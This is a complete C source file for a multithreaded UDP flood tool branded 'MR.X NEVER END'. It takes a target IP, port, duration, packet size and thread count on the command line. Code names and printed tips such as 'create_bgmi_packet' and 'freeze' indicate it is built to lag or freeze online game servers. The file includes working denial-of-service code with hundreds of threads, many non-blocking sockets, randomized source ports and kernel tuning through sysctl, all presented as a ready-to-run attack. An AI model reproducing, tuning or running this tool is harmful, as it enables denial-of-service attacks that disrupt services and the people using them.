#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>
#include <signal.h>

// ✅ OPTIMIZED FOR STABLE 677ms
#define FLOOD_SOCKETS 384
#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 28
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 150
#define MAX_THREADS 350
#define PORT_RANGE 40000
#define MIN_SRC_PORT 15000
#define MAX_SRC_PORT 55000
#define BATCH_UPDATE 25000
#define WARMUP_SECONDS 5
#define SOCKET_SNDBUF 8388608
#define SOCKET_RCVBUF 4194304
#define STATS_UPDATE_INTERVAL 2
#define RECONNECT_RETRIES 2
#define JITTER_RANGE 30
#define RECONNECT_INTERVAL 20000
#define REORDER_CHANCE 10
#define DIRECT_ATTACK_POWER 400
#define TARGET_PPS_HIGH_POWER 8000    // ✅ FIXED: 8K PPS per high-power thread
#define TARGET_PPS_NORMAL 80          // ✅ FIXED: 80 PPS per normal thread

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;
int DIRECT_THREADS_COUNT = 0;
int NORMAL_THREADS_COUNT = 0;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int warmup_complete = 0;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int current_warmup_phase = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=16777216 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=16777216 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=500000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=16777216 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=32768 >/dev/null 2>&1");
    
    system("sysctl -w net.ipv4.udp_mem='393216 524288 786432' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=8192 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=8192 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='15000 60000' >/dev/null 2>&1");
    
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    
    system("ulimit -n 524288 >/dev/null 2>&1");
    system("ulimit -u 65536 >/dev/null 2>&1");
#endif
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        return -1;
    }
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        return -1;
    }
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    return 0;
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int get_jitter_delay(unsigned int *seed) {
    return (int)(fast_rand(seed) % JITTER_RANGE);
}

int should_reorder_packet(unsigned int *seed) {
    return (fast_rand(seed) % 100) < REORDER_CHANCE;
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    if (size < MIN_PACKET_SIZE) size = MIN_PACKET_SIZE;
    if (size > MAX_PACKET_SIZE) size = MAX_PACKET_SIZE;
    
    memset(buf, 0, size);
    
    unsigned int *header = (unsigned int*)buf;
    
    header[0] = htonl(0x00000001);
    header[1] = htonl(seq + thread_id * 1000000);
    header[2] = htonl((unsigned int)time(NULL));
    
    unsigned int reorder_seq = seq;
    if (should_reorder_packet(seed) && seq > 20) {
        reorder_seq = seq - (3 + (fast_rand(seed) % 10));
    }
    header[3] = htonl(reorder_seq);
    
    if (size > 16) {
        buf[16] = 0x01;
        buf[17] = 0x02;
        buf[18] = 0x03;
        buf[19] = 0x04;
    }
    
    for (int i = 20; i < size; i++) {
        buf[i] = (char)((fast_rand(seed) + i + thread_id) & 0xFF);
    }
}

int reconnect_socket(int *sock, unsigned int *seed) {
    if (*sock >= 0) {
        close(*sock);
        *sock = -1;
    }
    
    *sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (*sock < 0) {
        return -1;
    }
    
    if (set_sock_buf(*sock) < 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    fcntl(*sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(*sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    return 0;
}

int get_warmup_multiplier(int phase) {
    return 800;
}

void *high_power_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char **packets = malloc(FLOOD_SOCKETS * sizeof(char*));
    
    if (!packets) return NULL;
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    int max_packet_size = PACKET_SIZE;
    if (max_packet_size > MAX_PACKET_SIZE) max_packet_size = MAX_PACKET_SIZE;
    
    int active_sockets = 0;
    for (int i = 0; i < FLOOD_SOCKETS && active_sockets < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            continue;
        }
        
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
            close(socks[i]);
            continue;
        }
        
        packets[i] = malloc(max_packet_size);
        if (!packets[i]) {
            close(socks[i]);
            continue;
        }
        
        active_sockets++;
    }
    
    if (active_sockets == 0) {
        free(packets);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_counter = thread_idx * 1000000;
    time_t last_second = time(NULL);
    unsigned long long packets_this_second = 0;
    
    usleep(1000);
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        time_t now = time(NULL);
        if (now != last_second) {
            last_second = now;
            packets_this_second = 0;
        }
        
        int power_level;
        if (atomic_load(&warmup_complete)) {
            power_level = DIRECT_ATTACK_POWER;
        } else {
            power_level = 800;
        }
        
        int target_packets_per_second = TARGET_PPS_HIGH_POWER;
        int packets_per_burst = 50;
        
        if (packets_this_second >= target_packets_per_second) {
            usleep(1000);
            continue;
        }
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            create_bgmi_packet(packets[i], max_packet_size, thread_idx, seq_counter, &seed);
            
            int remaining_packets = target_packets_per_second - packets_this_second;
            int current_burst = (packets_per_burst * power_level) / 100;
            if (current_burst > remaining_packets) current_burst = remaining_packets;
            if (current_burst < 1) current_burst = 1;
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], max_packet_size, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret == max_packet_size) {
                    local_packets++;
                    local_bytes += max_packet_size;
                    seq_counter++;
                    packets_this_second++;
                } else if (ret < 0) {
                    if (errno != EAGAIN && errno != EWOULDBLOCK) {
                        reconnect_socket(&socks[i], &seed);
                    }
                    break;
                }
            }
            
            if (local_packets >= BATCH_UPDATE) {
                atomic_fetch_add(&total_packets, local_packets);
                atomic_fetch_add(&total_bytes, local_bytes);
                local_packets = 0;
                local_bytes = 0;
            }
        }
        
        usleep(100);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    free(packets);
    
    return NULL;
}

void *normal_attack(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores > 0) {
        int core = tid % num_cores;
        if (core < CPU_SETSIZE) {
            CPU_SET(core, &cpuset);
            pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
        }
    }
#endif
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) return NULL;
    
    int sock = -1;
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_local = tid * 777777;
    time_t last_second = time(NULL);
    unsigned long long packets_this_second = 0;
    
    if (reconnect_socket(&sock, &seed) < 0) {
        free(packet);
        return NULL;
    }
    
    usleep(1000);
    
    int jitter = get_jitter_delay(&seed);
    usleep(jitter * 100);
    
    int target_packets_per_second = TARGET_PPS_NORMAL;
    int packets_per_burst = 10;
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        
        time_t now = time(NULL);
        if (now != last_second) {
            last_second = now;
            packets_this_second = 0;
        }
        
        int power_level;
        if (atomic_load(&warmup_complete)) {
            power_level = 100;
        } else {
            power_level = 800;
        }
        
        if (packets_this_second >= target_packets_per_second) {
            usleep(1000);
            continue;
        }
        
        create_bgmi_packet(packet, PACKET_SIZE, tid, seq_local, &seed);
        
        int remaining_packets = target_packets_per_second - packets_this_second;
        int current_burst = (packets_per_burst * power_level) / 100;
        if (current_burst > remaining_packets) current_burst = remaining_packets;
        if (current_burst < 1) current_burst = 1;
        
        for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
            int ret = sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret == PACKET_SIZE) {
                local_packets++;
                local_bytes += PACKET_SIZE;
                seq_local++;
                packets_this_second++;
            } else if (ret < 0) {
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    reconnect_socket(&sock, &seed);
                }
                break;
            }
        }
        
        if (local_packets >= 10000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(1000);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    if (sock >= 0) close(sock);
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    if (tid < DIRECT_THREADS_COUNT) {
        return high_power_attack(arg);
    } else {
        return normal_attack(arg);
    }
}

void *warmup_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds (800%% constant power)...\n", WARMUP_SECONDS);
    
    atomic_store(&should_attack, 1);
    
    for (int phase = 0; phase < WARMUP_SECONDS && !atomic_load(&stop_signal); phase++) {
        atomic_store(&current_warmup_phase, phase);
        printf("⚡ Phase %d: 800%% power\n", phase + 1);
        
        if (phase < WARMUP_SECONDS - 1) {
            sleep(1);
        }
    }
    
    if (!atomic_load(&stop_signal)) {
        atomic_store(&warmup_complete, 1);
        printf("✅ Warm-up complete (800%% peak achieved)\n");
        printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    }
    
    return NULL;
}

void *attack_timer(void *arg) {
    int total_time = WARMUP_SECONDS + ATTACK_TIME;
    
    for (int sec = 0; sec < total_time && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&total_elapsed, 1);
        
        if (sec >= WARMUP_SECONDS) {
            atomic_fetch_add(&attack_seconds, 1);
        }
    }
    
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    time_t last_update = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        
        time_t now = time(NULL);
        int elapsed = (int)(now - last_update);
        if (elapsed < 1) elapsed = 1;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long packets_diff = curr_packets - prev_packets;
        unsigned long long pps = packets_diff / elapsed;
        
        if (atomic_load(&should_attack)) {
            unsigned long long bytes_diff = curr_bytes - prev_bytes;
            double megabytes = bytes_diff / (1024.0 * 1024.0);
            
            atomic_store(&current_pps, pps);
            
            if (pps > atomic_load(&peak_pps)) {
                atomic_store(&peak_pps, pps);
            }
            
            if (!atomic_load(&warmup_complete)) {
                printf("💥 Breaking: %lluK PPS\n", pps/1000);
            } else {
                printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes);
            }
        }
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        last_update = now;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    if (ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) {
        THREAD_COUNT = max_threads - 50;
    }
#endif
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    DIRECT_THREADS_COUNT = THREAD_COUNT / 4;
    if (DIRECT_THREADS_COUNT < 2) DIRECT_THREADS_COUNT = 2;
    if (DIRECT_THREADS_COUNT > 40) DIRECT_THREADS_COUNT = 40;
    
    NORMAL_THREADS_COUNT = THREAD_COUNT - DIRECT_THREADS_COUNT;
    
    printf("\n========== 🚀 MR.X NEVER END 🚀 ==========\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏱️  Time: %d seconds (10-300)\n", ATTACK_TIME);
    printf("📦 Packet Size: %d bytes (28-128)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (150-350)\n", THREAD_COUNT);
    printf("   ├─ Normal Attack: %d threads\n", NORMAL_THREADS_COUNT);
    printf("   └─ High Power: %d threads (384 sockets each)\n", DIRECT_THREADS_COUNT);
    printf("⚡ Direct Attack Power: %d%%\n", DIRECT_ATTACK_POWER);
    printf("🔥 Warm-up: 800%% constant power in 5s\n");
    printf("🔧 Optimized for 677ms continuous ping\n");
    printf("===============================================\n");
    
    if (PACKET_SIZE <= 40) {
        printf("💡 Tip: 28-40 bytes = Maximum PPS\n");
    } else if (PACKET_SIZE <= 100) {
        printf("💡 Tip: 41-100 bytes = Balanced freeze\n");
    } else {
        printf("💡 Tip: 101-128 bytes = Corruption freeze\n");
    }
    printf("\n");
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    optimize_kernel();
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&warmup_complete, 0);
    atomic_store(&attack_seconds, 0);
    atomic_store(&total_elapsed, 0);
    atomic_store(&current_warmup_phase, 0);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        return 1;
    }
    
    printf("🚀 Creating %d attack threads...\n", THREAD_COUNT);
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
        if (i % 100 == 0) usleep(1000);
    }
    
    pthread_t warmup_thread;
    pthread_create(&warmup_thread, NULL, warmup_controller, NULL);
    
    pthread_t timer_thread;
    pthread_create(&timer_thread, NULL, attack_timer, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    pthread_join(timer_thread, NULL);
    pthread_join(warmup_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    } else if (atomic_load(&total_elapsed) > 0) {
        printf("\n⚠️  Attack stopped before completion\n");
    }
    
    free(threads);
    free(tids);
    
    printf("\n✅ Cleanup complete\n");
    
    return 0;
}